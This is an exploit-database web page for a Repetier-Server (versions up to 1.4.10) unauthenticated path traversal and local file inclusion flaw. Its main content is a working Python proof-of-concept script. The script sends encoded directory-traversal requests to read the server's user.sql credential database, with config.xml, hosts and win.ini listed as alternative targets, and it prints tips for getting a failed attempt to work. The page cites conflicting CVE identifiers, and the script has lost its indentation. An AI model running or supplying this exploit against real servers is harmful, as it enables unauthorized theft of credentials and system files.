---
title: Repetier-Server < = 1.4.10 - Unauthenticated Path Traversal / Local File Inclusion
url: https://cxsecurity.com/issue/WLB-2026020018
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-02-19
fetch_date: 2026-02-20T04:07:03.808682
---

# Repetier-Server < = 1.4.10 - Unauthenticated Path Traversal / Local File Inclusion

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Repetier-Server <= 1.4.10 - Unauthenticated Path Traversal / Local File Inclusion** **2026.02.19**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-31059](https://cxsecurity.com/cveshow/CVE-2023-31059/ "Click to see CVE-2023-31059")**  CWE: **[CWE-22 Improper Limitation of a Pathname to a Restricted Directory (&#039;Path Traversal&#039;)](https://cxsecurity.com/cwe/CWE-22%20Improper%20Limitation%20of%20a%20Pathname%20to%20a%20Restricted%20Directory%20%28%26#039;Path Traversal&#039;) "Click to see CWE-22 Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')")** | |

#!/usr/bin/env python3
# Exploit Title: Repetier-Server <= 1.4.10 - Unauthenticated Path Traversal / Local File Inclusion
# Exploit Author: Mohammed Idrees Banyamer
# Vendor Homepage: https://www.repetier.com/
# Version: <= 1.4.10
# Tested on: Windows 10 / Windows Server 2019 (Repetier-Server default install)
# CVE: CVE-2026-26335
# Advisory: https://cybir.com/2023/cve/poc-repetier-server-140/ (related research)
# CVSS: 9.8 (Critical) - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
import requests
import argparse
import sys
from urllib.parse import urljoin
def generate\_traversal(depth: int = 15) -> str:
return "..%5c" \* depth
def attempt\_read(target\_url: str, file\_path: str, traversal\_depth: int = 15, timeout: int = 10) -> bool:
traversal = generate\_traversal(traversal\_depth)
payloads = [
f"views{traversal}{file\_path}/base/connectionLost.php",
f"base/connectionLost.php?file={traversal}{file\_path}",
]
print(f"[\*] Targeting: {target\_url}")
print(f"[\*] Attempting to read: {file\_path}")
print(f"[\*] Traversal depth: {traversal\_depth}")
for payload in payloads:
exploit\_url = urljoin(target\_url.rstrip("/") + "/", payload)
try:
print(f" → Trying: {exploit\_url}")
r = requests.get(exploit\_url, timeout=timeout, verify=False)
if r.status\_code == 200 and len(r.content) > 60:
sample = r.text[:500].replace("\n", " ").strip()
print(f"[+] LIKELY SUCCESS (status {r.status\_code}, {len(r.content)} bytes)")
print(f" Preview:\n {sample}...")
return True
else:
print(f" → Failed (status {r.status\_code}, size {len(r.content)})")
except requests.RequestException as e:
print(f" → Error: {e}")
return False
def main():
parser = argparse.ArgumentParser(
description="CVE-2026-26335 PoC - Repetier-Server Path Traversal / LFI"
)
parser.add\_argument("target", help="Target base URL (e.g. http://192.168.1.100:3344/)")
parser.add\_argument("--file", default="ProgramData\\Repetier-Server\\database\\user.sql",
help="File path to read (use Windows \\ separator)")
parser.add\_argument("--depth", type=int, default=15, help="Traversal depth")
parser.add\_argument("--test", action="store\_true", help="Quick test with Windows\\win.ini")
args = parser.parse\_args()
if args.test:
args.file = "Windows\\win.ini"
print("[i] Running test mode → targeting Windows\\win.ini")
file\_path = args.file.replace("\\", "%5c")
print("=" \* 70)
print("CVE-2026-26335 Exploit PoC - Repetier-Server <=1.4.10 Path Traversal")
print("USE ONLY ON SYSTEMS YOU OWN OR HAVE EXPLICIT PERMISSION TO TEST!")
print("=" \* 70, "\n")
success = attempt\_read(args.target, file\_path, args.depth)
if not success:
print("\n[!] Exploitation attempt failed.")
print("Suggestions:")
print(" • Increase --depth (try 18–30)")
print(" • Verify target is running Repetier-Server <=1.4.10")
print(" • Try alternative interesting files:")
print(" - ProgramData%5cRepetier-Server%5cconfig.xml")
print(" - Windows%5csystem32%5cdrivers%5cetc%5chosts")
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026020018)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top